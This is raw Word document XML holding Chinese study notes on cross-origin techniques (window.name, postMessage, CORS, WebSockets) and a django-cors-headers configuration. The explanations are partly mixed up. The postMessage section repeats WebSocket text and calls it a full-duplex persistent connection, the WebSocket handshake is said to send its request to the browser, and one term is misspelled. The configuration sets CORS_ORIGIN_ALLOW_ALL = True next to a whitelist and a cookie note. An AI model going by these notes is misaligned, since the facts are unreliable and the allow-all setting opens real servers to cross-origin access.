      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window. name</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>都有读写的权利，</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">window.name </w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是持久存在一个窗口载入过的所有页面中的！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA1026F"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3.window.postMessage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE720CF" w14:textId="54BE3673"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1</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HTML5</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>引入了一个全新的</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：跨文档消息传输</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Cross Document Messaging </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。它的目标是在一个单独的持久连接上提供全双工、双向通信。（同源策略对</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不适用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E27FCA" w14:textId="3134FA3B"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2</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web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>原理：在</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>JS</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建了</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>之后，会有一个</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>升级从</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议交换为</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4D3303" w14:textId="6CF3626C"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3</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otherWindow.postMessage(message, targetOrigin) otherWindow</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：指目标窗口，也就是给哪个窗口发消息，是</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window.frames</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>属性的成员或者由</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>window.open</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法创建的窗口。</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>参数说明：</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (1)message</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：是要发送的消息，类型为</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>object (2)targetOrigin</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：是限定消息接收范围，不限制使用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>“ * ”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAAD0A1"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4.CORS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12A8D3" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56"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Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>基本思想：使用自定义的</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E375B4"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5.web sockets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39274612" w14:textId="1F57DFB7"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1</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web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是浏览器的一种</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，它的目标是在一个单独的持久连接上提供全双工、双向通信。</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>同源策略对</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不适用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B7E58D" w14:textId="4A927C14" w:rsidR="008B2E56" w:rsidRPr="0095285B" w:rsidRDefault="0095285B"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockets</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>原理：在</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>JS</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建了</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web socket</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>之后，会有一个</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>升级从</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议交换为</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web sockt</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="0095285B">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EE10DD"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6.django-cors-headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F09C26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pip install django-cors-headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6474CF2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INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703ADE75"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pip install django-cors-headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D75148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解决同源策略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA274B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'corsheaders',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06643DE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添加</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>drf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA70A2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'rest_framework',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793D481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评论</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0396F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"comments",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C337E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67447F45"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MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D3588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4BF8F4E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'django.middleware.clickjacking.XFrameOptionsMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D95B4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跨域中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358E8BB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'corsheaders.middleware.CorsMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38924FF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601336F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4.</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>添加白名单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C31437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 xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>指定可以跨域访问当前服务器</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(127.0.0.1:8000)</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的白名单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F688A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CORS_ORIGIN_WHITELIST = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E5F0C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 '127.0.0.1:8080',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1453926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 'localhost:8080',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65257B5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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FADD8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指定在跨域访问中，后台是否支持传送</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5812559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允许跨域源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526A8D39"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CORS_ORIGIN_ALLOW_ALL = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB897D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设置请求方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A65F5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CORS_ALLOW_METHODS = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A52C1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'DELETE',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5099DFE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'GET',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3051F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'OPTIONS',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC4C2B9"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'PATCH',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196F1F2E"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'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570BF7C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'PUT',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012EA0B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'VIEW',</w:t>
      </w:r>
    </w:p>
